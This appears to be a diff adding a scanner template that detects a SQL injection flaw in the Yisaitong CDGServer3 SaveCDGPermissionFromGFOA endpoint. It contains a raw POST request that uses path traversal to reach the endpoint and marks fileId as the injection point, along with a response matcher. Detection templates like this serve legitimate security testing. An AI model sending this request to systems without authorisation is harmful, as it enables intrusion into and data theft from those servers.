@@ -1,0 +1,24 @@
+id: yisaitong-SaveCDGPermissionFromGFOA-sqli
+
+info:
+  name: 亿赛通 SaveCDGPermissionFromGFOA SQL注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+
+
+      - |
+        POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fileId=1*&pis=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200  && body=="" && contains_all(all_headers, "CDGServer3","Set-Cookie")
+
+
